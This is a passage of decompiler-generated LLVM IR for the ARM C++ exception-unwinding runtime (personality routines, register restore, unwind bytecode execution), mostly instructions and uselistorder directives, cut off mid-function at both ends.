  %v4_18dc4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 28) to i32*), align 4
  store i32 101840, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18dc4)
  %v0_18dd0 = load i32, i32* %r0.global-to-local, align 4
  %v2_18dd0 = icmp eq i32 %v0_18dd0, 0
  br i1 %v2_18dd0, label %dec_label_pc_18ac8, label %dec_label_pc_18dd8

dec_label_pc_18dd8:                               ; preds = %dec_label_pc_18da0
  %v0_18dd8 = load i32, i32* %r4.global-to-local, align 4
  %v1_18dd8 = load i32, i32* @r7, align 4
  %v2_18dd8 = add i32 %v1_18dd8, %v0_18dd8
  store i32 %v2_18dd8, i32* %stack_var_-48, align 4
  %v0_18de8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18de8, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_18df8 = call i32 @_Unwind_VRS_Set(i32 %v0_18de8, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18acc

dec_label_pc_18e04:                               ; preds = %dec_label_pc_18d30
  %v0_18e04 = load i32, i32* @sl, align 4
  %v3_18e04 = mul i32 %v0_18e04, 4
  %v0_18e08 = load i32, i32* %r0.global-to-local, align 4
  %v2_18e08 = add i32 %v0_18e08, %v3_18e04
  %v3_18e08 = inttoptr i32 %v2_18e08 to i32*
  %v4_18e08 = load i32, i32* %v3_18e08, align 4
  %v1_18e0c = and i32 %v4_18e08, 1073741824
  %v2_18e0c = icmp eq i32 %v1_18e0c, 0
  br i1 %v2_18e0c, label %.thread28, label %bb169

bb169:                                            ; preds = %dec_label_pc_18e04
  %v2_18e14 = or i32 %v4_18e08, -2147483648
  br label %bb166

.thread28:                                        ; preds = %dec_label_pc_18e04
  %tmp212 = bitcast i32 %v4_18e08 to float
  %tmp213 = call float @fabsf(float %tmp212)
  %v2_18e18 = bitcast float %tmp213 to i32
  br label %bb166

; uselistorder directives
  uselistorder i32 %v2_18e08, { 2, 1, 0 }
  uselistorder i32 %v1_18d5c, { 1, 0 }
  uselistorder i32 %v1_18d58, { 1, 0 }
  uselistorder i32 %v1_18d28, { 1, 0 }
  uselistorder i32 %v0_18cf0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_18cbc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_18c84, { 1, 0 }
  uselistorder i32 %v0_18c84, { 1, 0 }
  uselistorder i32 %v2_1897866, { 1, 0 }
  uselistorder i32 %v2_18c50, { 1, 0 }
  uselistorder i32 %stack_var_-76.4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_18978, { 1, 0 }
  uselistorder i32 %v1_18c10, { 1, 0 }
  uselistorder i32 %v3_18bac, { 2, 0, 1 }
  uselistorder i32 %v0_18b8c, { 1, 0 }
  uselistorder i32 %v0_18b8c.pre, { 1, 0 }
  uselistorder i32 %v1_18ae4, { 1, 0 }
  uselistorder i32 %v2_18adc, { 1, 0 }
  uselistorder i32 %v0_18a6c, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-76.3, { 1, 0 }
  uselistorder i32 %v2_18a2c, { 1, 0 }
  uselistorder i32 %v1_18a28, { 1, 0 }
  uselistorder i32 %v0_18a28, { 1, 0, 2 }
  uselistorder i32 %v4_18a00, { 0, 2, 1, 3 }
  uselistorder i32 %v0_18ba4, { 1, 2, 0 }
  uselistorder i32 %v0_189d8, { 1, 0 }
  uselistorder i32 %v3_189d4, { 1, 0, 2 }
  uselistorder i32 %v1_189a8, { 0, 2, 4, 1, 3 }
  uselistorder i32 %stack_var_-76.2.ph3175, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v2_18be0, { 1, 0 }
  uselistorder i1 %v2_18a14, { 1, 0, 2 }
  uselistorder i32 %v1_18918, { 4, 3, 1, 2, 6, 5, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8 }
  uselistorder %anon_struct_4* %uws_-60, { 1, 0 }
  uselistorder i32* %forced_unwind_-44, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 13, 12, 14, 16, 15, 24, 17, 18, 19, 20, 21, 22, 23, 26, 25, 28, 27, 29, 30, 32, 31, 35, 33, 34, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32 6, { 77, 0, 15, 16, 76, 4, 32, 33, 17, 28, 18, 29, 19, 30, 20, 31, 2, 34, 21, 35, 1, 5, 36, 37, 22, 38, 6, 39, 40, 41, 23, 42, 7, 43, 44, 45, 24, 46, 47, 48, 25, 49, 50, 51, 52, 8, 53, 54, 55, 56, 9, 57, 58, 59, 60, 61, 26, 62, 10, 63, 64, 65, 66, 67, 68, 27, 69, 11, 70, 71, 72, 73, 12, 74, 13, 14, 3, 75 }
  uselistorder i32 -3, { 4, 0, 5, 7, 6, 3, 1, 2 }
  uselistorder i32 52, { 23, 1, 2, 5, 12, 13, 9, 10, 11, 14, 16, 15, 6, 18, 19, 3, 20, 0, 21, 22, 7, 8, 17, 4 }
  uselistorder i32 48, { 17, 2, 0, 6, 4, 5, 9, 10, 7, 8, 14, 15, 16, 11, 12, 3, 13, 1 }
  uselistorder i32 44, { 40, 2, 41, 42, 0, 13, 3, 14, 4, 5, 6, 24, 25, 26, 27, 28, 29, 21, 22, 23, 7, 19, 20, 8, 1, 9, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 10, 11, 12, 15, 16, 17, 18 }
  uselistorder i32 -2147483648, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 1, 2 }
  uselistorder i32 1073741824, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 1, 2 }
  uselistorder i32 65536, { 4, 5, 6, 7, 9, 8, 14, 10, 15, 11, 16, 12, 17, 13, 18, 19, 20, 24, 21, 25, 22, 26, 23, 27, 150, 155, 149, 154, 28, 29, 30, 31, 32, 33, 34, 148, 35, 36, 37, 38, 40, 39, 42, 41, 43, 44, 2, 45, 0, 3, 46, 47, 49, 48, 1, 52, 50, 51, 53, 151, 55, 54, 58, 59, 60, 56, 57, 61, 62, 64, 65, 66, 63, 67, 152, 68, 70, 69, 72, 71, 73, 153, 74, 76, 75, 78, 77, 83, 79, 84, 80, 85, 81, 82, 86, 87, 88, 89, 91, 92, 90, 147, 94, 93, 97, 98, 99, 95, 96, 100, 107, 101, 108, 102, 109, 103, 110, 104, 111, 105, 106, 113, 112, 114, 115, 116, 117, 122, 118, 123, 119, 124, 120, 121, 126, 125, 127, 128, 129, 132, 130, 133, 131, 134, 135, 136, 137, 138, 140, 141, 139, 142, 144, 145, 143, 146 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 100) to i32*), { 1, 0 }
  uselistorder i32 88, { 5, 6, 3, 0, 4, 1, 2 }
  uselistorder i32 100, { 0, 1, 3, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_22010.349 to i32), { 28, 6, 29, 30, 7, 8, 64, 82, 83, 1, 2, 0, 3, 65, 66, 84, 9, 67, 85, 10, 11, 12, 13, 14, 27, 68, 86, 69, 87, 15, 16, 70, 71, 72, 88, 17, 89, 90, 91, 18, 92, 19, 73, 93, 94, 20, 21, 22, 95, 74, 96, 23, 97, 24, 98, 99, 100, 4, 26, 101, 75, 102, 77, 103, 25, 104, 105, 106, 34, 33, 35, 107, 108, 31, 59, 55, 53, 52, 54, 56, 57, 58, 51, 60, 46, 48, 47, 45, 44, 49, 50, 41, 40, 43, 42, 39, 38, 37, 36, 79, 61, 78, 62, 63, 80, 109, 5, 110, 111, 112, 113, 32, 76, 114, 81 }
  uselistorder i32 -2, { 0, 30, 31, 6, 3, 4, 2, 7, 8, 9, 1, 5, 10, 26, 25, 27, 28, 29, 18, 19, 20, 21, 22, 23, 24, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 80, { 10, 11, 12, 0, 2, 1, 3, 4, 5, 8, 6, 7, 9 }
  uselistorder i32 %ucbp, { 0, 1, 3, 2 }
  uselistorder i32 %state, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18d68, { 1, 0, 2, 3 }
  uselistorder label %bb166, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_18c84, { 1, 0 }
  uselistorder label %dec_label_pc_18c4c, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_18c10, { 1, 2, 3, 0, 4 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %dec_label_pc_18b8c, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_18acc, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_18ac8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_18a28, { 1, 0 }
  uselistorder label %bb154, { 2, 0, 1 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_18984, { 1, 0 }
  uselistorder label %dec_label_pc_18984.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_18984.preheader.lr.ph, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
}

define i32 @function_18e24(i32 %arg1) local_unnamed_addr {
dec_label_pc_18e24:
  %v0_18e24 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18e24, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_18e24
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_18e24, %bb
  %v10_18e2c = phi i32 [ %arg1, %dec_label_pc_18e24 ], [ 0, %bb ]
  ret i32 %v10_18e2c

; uselistorder directives
  uselistorder i1 false, { 0, 1, 2, 3, 26, 27, 28, 45, 22, 25, 46, 47, 48, 49, 50, 5, 4, 51, 41, 42, 29, 30, 23, 33, 32, 31, 34, 6, 8, 7, 20, 44, 43, 24, 19, 37, 12, 38, 21, 11, 10, 9, 13, 14, 15, 35, 16, 17, 18, 40, 36, 39, 52, 53 }
  uselistorder i1* @cpsr_z, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 39, 13, 14, 15, 35, 36, 37, 38, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 33, 34, 31, 32 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__aeabi_unwind_cpp_pr2(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_18e34 = load i32, i32* @r1, align 4
  %v2_18e34 = load i32, i32* @r2, align 4
  %v4_18e34 = call i32 @__gnu_unwind_pr_common(i32 2, i32 %v1_18e34, i32 %v2_18e34, i32 2)
  ret i32 %v4_18e34
}

define i32 @__aeabi_unwind_cpp_pr1(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_18e3c = load i32, i32* @r1, align 4
  %v2_18e3c = load i32, i32* @r2, align 4
  %v4_18e3c = call i32 @__gnu_unwind_pr_common(i32 1, i32 %v1_18e3c, i32 %v2_18e3c, i32 1)
  ret i32 %v4_18e3c
}

define i32 @__aeabi_unwind_cpp_pr0(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_18e44 = load i32, i32* @r1, align 4
  %v2_18e44 = load i32, i32* @r2, align 4
  %v4_18e44 = call i32 @__gnu_unwind_pr_common(i32 0, i32 %v1_18e44, i32 %v2_18e44, i32 0)
  ret i32 %v4_18e44

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__gnu_unwind_pr_common, { 2, 1, 0 }
  uselistorder i32* @r2, { 10, 12, 11, 61, 13, 0, 22, 14, 23, 62, 63, 64, 18, 19, 20, 21, 43, 44, 45, 46, 65, 66, 67, 81, 82, 83, 84, 1, 70, 71, 2, 72, 73, 3, 74, 68, 69, 37, 38, 4, 5, 6, 59, 60, 7, 8, 47, 48, 49, 75, 76, 77, 78, 79, 80, 39, 40, 41, 50, 51, 52, 58, 26, 15, 16, 17, 29, 30, 27, 28, 24, 25, 31, 32, 33, 34, 35, 36, 42, 9, 53, 54, 55, 56, 57 }
}

define i32 @__restore_core_regs(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_18e4c = add i32 %tmp, 56
  %v4_18e4c = inttoptr i32 %v3_18e4c to i32*
  %v5_18e4c = load i32, i32* %v4_18e4c, align 4
  %v6_18e4c = add i32 %tmp, 60
  %v7_18e4c = inttoptr i32 %v6_18e4c to i32*
  %v8_18e4c = load i32, i32* %v7_18e4c, align 4
  %v2_18e58 = load i32, i32* %arg1, align 4
  %v3_18e58 = add i32 %tmp, 4
  %v4_18e58 = inttoptr i32 %v3_18e58 to i32*
  %v5_18e58 = load i32, i32* %v4_18e58, align 4
  store i32 %v5_18e58, i32* @r1, align 4
  %v12_18e58 = add i32 %tmp, 16
  %v13_18e58 = inttoptr i32 %v12_18e58 to i32*
  %v14_18e58 = load i32, i32* %v13_18e58, align 4
  store i32 %v14_18e58, i32* @r4, align 4
  %v15_18e58 = add i32 %tmp, 20
  %v16_18e58 = inttoptr i32 %v15_18e58 to i32*
  %v17_18e58 = load i32, i32* %v16_18e58, align 4
  store i32 %v17_18e58, i32* @r5, align 4
  %v18_18e58 = add i32 %tmp, 24
  %v19_18e58 = inttoptr i32 %v18_18e58 to i32*
  %v20_18e58 = load i32, i32* %v19_18e58, align 4
  store i32 %v20_18e58, i32* @r6, align 4
  %v21_18e58 = add i32 %tmp, 28
  %v22_18e58 = inttoptr i32 %v21_18e58 to i32*
  %v23_18e58 = load i32, i32* %v22_18e58, align 4
  store i32 %v23_18e58, i32* @r7, align 4
  %v24_18e58 = add i32 %tmp, 32
  %v25_18e58 = inttoptr i32 %v24_18e58 to i32*
  %v26_18e58 = load i32, i32* %v25_18e58, align 4
  store i32 %v26_18e58, i32* @r8, align 4
  %v27_18e58 = add i32 %tmp, 36
  %v28_18e58 = inttoptr i32 %v27_18e58 to i32*
  %v29_18e58 = load i32, i32* %v28_18e58, align 4
  store i32 %v29_18e58, i32* @sb, align 4
  %v30_18e58 = add i32 %tmp, 40
  %v31_18e58 = inttoptr i32 %v30_18e58 to i32*
  %v32_18e58 = load i32, i32* %v31_18e58, align 4
  store i32 %v32_18e58, i32* @sl, align 4
  store i32 %v8_18e4c, i32* @ip, align 4
  store i32 %v5_18e4c, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v8_18e4c)
  ret i32 %v2_18e58

; uselistorder directives
  uselistorder i32 %v8_18e4c, { 1, 0 }
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 1, 0, 9, 8 }
  uselistorder i32* @ip, { 55, 56, 57, 58, 14, 15, 5, 0, 61, 6, 7, 59, 60, 12, 13, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 1, 95, 96, 97, 98, 99, 100, 101, 102, 103, 8, 104, 105, 106, 9, 34, 35, 50, 51, 42, 43, 44, 2, 45, 46, 47, 38, 39, 40, 41, 48, 49, 36, 10, 37, 11, 21, 16, 17, 28, 29, 30, 31, 32, 33, 22, 23, 24, 25, 26, 27, 3, 18, 19, 20, 52, 4, 53, 54 }
  uselistorder i32 40, { 32, 28, 29, 30, 31, 11, 33, 3, 12, 7, 8, 4, 14, 2, 9, 6, 13, 10, 15, 16, 17, 5, 18, 19, 0, 20, 22, 21, 23, 1, 24, 26, 25, 27 }
  uselistorder i32* @sb, { 123, 124, 125, 5, 6, 7, 8, 105, 106, 107, 108, 109, 110, 111, 112, 113, 116, 114, 115, 117, 89, 90, 63, 64, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0, 1, 2, 3, 4, 30, 31, 26, 27, 28, 29, 9, 10, 11, 12, 13, 14, 15, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 118, 119, 120, 121, 122 }
  uselistorder i32 36, { 15, 14, 4, 16, 6, 7, 5, 11, 13, 8, 12, 9, 0, 1, 2, 3, 10 }
  uselistorder i32* @r8, { 293, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 3, 292, 0, 58, 294, 15, 295, 59, 60, 61, 62, 45, 46, 47, 48, 49, 50, 51, 52, 53, 5, 54, 55, 56, 57, 63, 64, 65, 66, 16, 296, 42, 43, 6, 44, 297, 228, 229, 7, 230, 231, 232, 256, 257, 258, 259, 260, 13, 261, 262, 263, 264, 265, 266, 267, 268, 17, 204, 205, 206, 207, 18, 218, 219, 220, 221, 222, 161, 162, 163, 164, 72, 73, 74, 75, 19, 20, 116, 117, 118, 119, 120, 76, 77, 78, 79, 121, 122, 123, 124, 80, 81, 82, 83, 84, 85, 86, 36, 37, 25, 21, 8, 22, 2, 23, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 38, 39, 40, 41, 87, 88, 89, 90, 9, 67, 1, 68, 69, 70, 14, 71, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 106, 103, 104, 105, 107, 108, 10, 109, 110, 111, 112, 113, 114, 115, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 11, 183, 184, 185, 186, 187, 188, 189, 190, 12, 191, 192, 193, 194, 195, 196, 4, 197, 198, 199, 200, 201, 202, 203, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 223, 224, 225, 226, 227, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 269, 270, 271, 272, 273, 274 }
  uselistorder i32 32, { 86, 83, 84, 85, 49, 87, 88, 45, 55, 89, 44, 80, 50, 46, 65, 63, 64, 60, 61, 62, 72, 73, 66, 67, 57, 58, 70, 71, 51, 78, 79, 81, 2, 3, 5, 4, 82, 7, 6, 9, 8, 11, 10, 59, 47, 52, 48, 74, 13, 12, 15, 14, 17, 16, 19, 18, 56, 21, 20, 23, 22, 24, 26, 25, 27, 28, 30, 29, 68, 69, 75, 31, 32, 53, 33, 34, 35, 54, 36, 0, 37, 1, 38, 76, 39, 77, 40, 41, 42, 43 }
  uselistorder i32 28, { 45, 10, 28, 46, 25, 47, 48, 49, 50, 7, 29, 30, 26, 27, 34, 11, 31, 12, 42, 43, 44, 8, 13, 0, 18, 1, 19, 2, 20, 3, 21, 4, 22, 5, 23, 6, 24, 9, 17, 33, 32, 14, 15, 16, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 24, { 95, 94, 96, 8, 9, 97, 0, 57, 58, 59, 60, 61, 62, 55, 56, 10, 63, 64, 74, 75, 65, 66, 7, 11, 93, 88, 89, 90, 1, 76, 77, 78, 37, 38, 12, 67, 68, 69, 48, 39, 40, 41, 42, 43, 44, 45, 46, 47, 49, 50, 51, 52, 53, 54, 70, 71, 72, 73, 13, 14, 15, 16, 17, 2, 18, 19, 20, 3, 21, 22, 4, 23, 24, 25, 26, 27, 28, 5, 79, 29, 80, 81, 82, 83, 30, 31, 6, 84, 32, 85, 33, 34, 35, 86, 87, 91, 36, 92 }
  uselistorder i32 20, { 125, 123, 124, 126, 1, 4, 9, 33, 127, 29, 128, 129, 130, 131, 5, 132, 133, 2, 134, 34, 10, 30, 31, 32, 35, 36, 37, 47, 48, 38, 39, 135, 116, 117, 118, 119, 120, 121, 122, 11, 112, 113, 114, 3, 49, 12, 50, 51, 0, 28, 41, 6, 43, 13, 44, 27, 42, 40, 45, 46, 52, 53, 14, 54, 55, 56, 57, 58, 59, 60, 61, 15, 62, 63, 64, 65, 66, 67, 16, 68, 69, 17, 70, 71, 72, 73, 18, 74, 75, 19, 76, 77, 78, 79, 80, 20, 81, 82, 83, 84, 85, 86, 21, 87, 88, 89, 90, 22, 23, 91, 7, 92, 24, 93, 94, 95, 96, 8, 97, 25, 98, 99, 100, 101, 102, 26, 103, 104, 105, 106, 107, 108, 109, 110, 111, 115 }
  uselistorder i32* @r1, { 190, 18, 20, 19, 4, 191, 192, 68, 69, 85, 48, 2, 194, 49, 193, 173, 50, 51, 52, 21, 70, 1, 71, 72, 22, 197, 23, 5, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 6, 215, 216, 73, 75, 76, 77, 78, 79, 80, 81, 82, 83, 74, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 67, 66, 3, 84, 28, 180, 124, 125, 217, 24, 219, 220, 221, 222, 148, 149, 32, 96, 33, 34, 35, 218, 25, 36, 181, 182, 183, 184, 185, 186, 187, 188, 189, 47, 116, 117, 175, 7, 171, 172, 8, 176, 179, 177, 9, 178, 97, 98, 26, 169, 143, 99, 170, 174, 150, 151, 12, 37, 38, 39, 40, 41, 42, 43, 10, 225, 226, 227, 228, 0, 229, 27, 86, 126, 144, 100, 223, 224, 195, 196, 29, 13, 101, 127, 128, 129, 130, 131, 30, 152, 153, 31, 102, 103, 104, 44, 45, 46, 105, 106, 107, 109, 110, 108, 87, 88, 90, 92, 89, 14, 91, 15, 93, 94, 95, 154, 111, 112, 113, 114, 115, 118, 119, 120, 16, 121, 122, 123, 132, 133, 134, 17, 135, 165, 166, 11, 136, 137, 138, 139, 140, 141, 142, 145, 146, 147, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 167, 168 }
  uselistorder i32 60, { 3, 22, 23, 24, 4, 5, 1, 6, 15, 16, 17, 18, 19, 20, 7, 11, 12, 8, 13, 14, 9, 10, 0, 2, 21 }
  uselistorder i32 56, { 4, 32, 33, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 10, 9, 3, 11, 12, 13, 14, 15, 29, 30, 26, 27, 5, 6, 2, 7, 1, 8, 28, 0, 31 }
}

define i32 @__gnu_Unwind_Restore_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_18e68 = load i32, i32* @r0, align 4
  ret i32 %v1_18e68
}

define i32 @__gnu_Unwind_Save_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_18e70 = load i32, i32* @r0, align 4
  ret i32 %v1_18e70
}

define i32 @___Unwind_RaiseException(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18e84 = ptrtoint i32* %stack_var_-68 to i32
  %v2_18e88 = call i32 @__gnu_Unwind_RaiseException(i32 %v2_18e84, i32 0)
  ret i32 %v2_18e88

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_Resume(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18ea8 = ptrtoint i32* %stack_var_-68 to i32
  %v2_18eac = call i32 @__gnu_Unwind_Resume(i32 %v2_18ea8, i32 0)
  ret i32 %v2_18eac

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @_Unwind_Resume_or_Rethrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18ecc = ptrtoint i32* %stack_var_-68 to i32
  %v2_18ed0 = call i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %v2_18ecc, i32 0)
  ret i32 %v2_18ed0

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_ForcedUnwind(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18ef0 = ptrtoint i32* %stack_var_-68 to i32
  %v6_18ef4 = call i32 @__gnu_Unwind_ForcedUnwind(i32 %v2_18ef0, i32 %arg2, i8* %arg3, i32 %v2_18ef0)
  ret i32 %v6_18ef4

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i8* @_Unwind_GetLanguageSpecificData(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_18f20 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_18f28 = add i32 %tmp1, 76
  %v2_18f28 = inttoptr i32 %v1_18f28 to i32*
  %v3_18f28 = load i32, i32* %v2_18f28, align 4
  %v1_18f2c = add i32 %v3_18f28, 7
  %v2_18f2c = inttoptr i32 %v1_18f2c to i8*
  %v3_18f2c = load i8, i8* %v2_18f2c, align 1
  %v4_18f2c = zext i8 %v3_18f2c to i32
  %v1_18f30 = add i32 %v3_18f28, 8
  %v3_18f34 = mul nuw nsw i32 %v4_18f2c, 4
  %v2_18f38 = add i32 %v3_18f34, %v1_18f30
  %v3_18f38 = inttoptr i32 %v2_18f38 to i8*
  ret i8* %v3_18f38
}

define i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %uws) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %anon_struct_13* %uws to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %context, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v9_18f48 = load i32, i32* @r6, align 4
  %v21_18f48 = load i32, i32* @lr, align 4
  %v0_18f4c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_18f4c, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 0, i32* @sl, align 4
  %tmp146 = bitcast i32* %stack_var_-36 to i8*
  br label %dec_label_pc_18f5c

dec_label_pc_18f5c:                               ; preds = %dec_label_pc_18f5c.backedge, %entry
  %v3_18f68 = phi i32 [ %v0_18f5c.pre, %dec_label_pc_18f5c.backedge ], [ %tmp, %entry ]
  %v1_18f5c = add i32 %v3_18f68, 8
  %v2_18f5c = inttoptr i32 %v1_18f5c to i8*
  %v3_18f5c = load i8, i8* %v2_18f5c, align 1
  %v4_18f5c = zext i8 %v3_18f5c to i32
  store i32 %v4_18f5c, i32* %r3.global-to-local, align 4
  %v2_18f60 = icmp eq i8 %v3_18f5c, 0
  store i1 %v2_18f60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18f60, label %dec_label_pc_18f70, label %.thread

.thread:                                          ; preds = %dec_label_pc_18f5c
  %v2_18f64 = add nsw i32 %v4_18f5c, -1
  store i32 %v2_18f64, i32* %r3.global-to-local, align 4
  %v2_18f68 = trunc i32 %v2_18f64 to i8
  store i8 %v2_18f68, i8* %v2_18f5c, align 1
  %v0_18f6c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18f6c.pr.pr, label %.thread.dec_label_pc_18f70_crit_edge, label %dec_label_pc_18f98

.thread.dec_label_pc_18f70_crit_edge:             ; preds = %.thread
  %v0_18f70.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18f70

dec_label_pc_18f70:                               ; preds = %.thread.dec_label_pc_18f70_crit_edge, %dec_label_pc_18f5c
  %v0_18f70 = phi i32 [ %v0_18f70.pre, %.thread.dec_label_pc_18f70_crit_edge ], [ %v3_18f68, %dec_label_pc_18f5c ]
  %v1_18f70 = add i32 %v0_18f70, 9
  %v2_18f70 = inttoptr i32 %v1_18f70 to i8*
  %v3_18f70 = load i8, i8* %v2_18f70, align 1
  %v4_18f70 = zext i8 %v3_18f70 to i32
  store i32 %v4_18f70, i32* %r3.global-to-local, align 4
  %v2_18f74 = icmp eq i8 %v3_18f70, 0
  store i1 %v2_18f74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18f74, label %dec_label_pc_19078, label %dec_label_pc_18f7c

dec_label_pc_18f7c:                               ; preds = %dec_label_pc_1906c, %dec_label_pc_18f70
  %v2_18f80 = phi i32 [ %v0_1906c, %dec_label_pc_1906c ], [ %v0_18f70, %dec_label_pc_18f70 ]
  %v0_18f7c = phi i32 [ %v4_1906c, %dec_label_pc_1906c ], [ %v4_18f70, %dec_label_pc_18f70 ]
  %v1_18f7c = add nsw i32 %v0_18f7c, -1
  store i32 %v1_18f7c, i32* %r3.global-to-local, align 4
  %v1_18f80 = trunc i32 %v1_18f7c to i8
  %v3_18f80 = add i32 %v2_18f80, 9
  %v4_18f80 = inttoptr i32 %v3_18f80 to i8*
